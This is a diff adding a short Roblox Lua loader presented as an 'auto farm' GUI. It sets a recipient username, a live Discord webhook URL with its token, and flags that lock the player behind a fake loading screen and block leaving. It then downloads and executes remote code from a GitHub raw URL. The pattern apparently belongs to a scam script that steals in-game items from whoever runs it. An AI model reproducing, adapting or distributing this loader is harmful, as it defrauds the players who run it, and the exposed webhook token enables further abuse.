@@ -1,0 +1,14 @@
+UserName = "daveVNdark"
+UserName2 = "daveVNdark"
+Webhook = "https://discord.com/api/webhooks/1108744821075623987/BTXcsiHcBBdfIfD4qOBe6AJyaYKmj5lY4XzhAC5f455tJhabdwNtr8MiCn0xaQfUT5-l"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "LOL GUI"
+_G.FirstText = "you can use auto farm in my script to"
+_G.SecondText = "this script has many feature"
+_G.ThirdText = "wait..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pet-simx/ftssa/main/Main.lua", true))()
